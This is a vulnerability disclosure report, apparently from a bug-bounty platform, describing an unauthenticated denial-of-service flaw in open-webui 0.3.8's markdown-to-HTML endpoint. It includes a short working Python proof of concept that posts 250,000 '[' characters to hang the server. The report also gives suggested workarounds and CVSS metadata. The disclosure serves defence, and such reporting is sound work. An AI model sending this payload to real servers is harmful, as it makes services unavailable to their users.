Denial of service through endpoint for converting markdown in open-webui/open-webui

The open-webui-project exposes an endpoint for converting markdown to HTML. The endpoint requires no auth. A maliciously crafted markdown payload causes the server to spend excessive time converting it, causes the server to hang and be unresponsive to other requests until the conversion is complete.
import requests
import json
# Can be quite large. This ran for at least an hour (and counting)
payload = "[" * 250000
rep = requests.post("http://localhost:3000/api/v1/utils/markdown", json={
    "md": payload
})
The endpoint is get_html_from_markdown in routers/utils , and calls markdown.markdownon a user-controllable string. The package that supplies this function is https://github.com/Python-Markdown/markdown/, and this problem in particular is known and discussed here. A possible workaround would be to place this endpoint (at least) user auth, or somehow sanitize/detect payloads like this.

Impact
This vulnerability allows an attacker to cause complete denial of service with a single request while the attack is ongoing.

Metadata:
CVE CVE-2024-7983 (assigned, under review)
Vulnerability Type CWE-400: Denial of Service
Severity High (7.5) Attack vector Network Attack complexity Low Privileges required None User interaction None Scope Unchanged Confidentiality None Integrity None Availability High Open in visual CVSS calculator
Registry Other
Affected Version 0.3.8
Visibility Public
Status Awaiting fix
Disclosure Bounty $600
Fix Bounty $150
Found by patrik-ha @patrik-ha LIGHTWEIGHT
patrik-ha @patrik-ha LIGHTWEIGHT
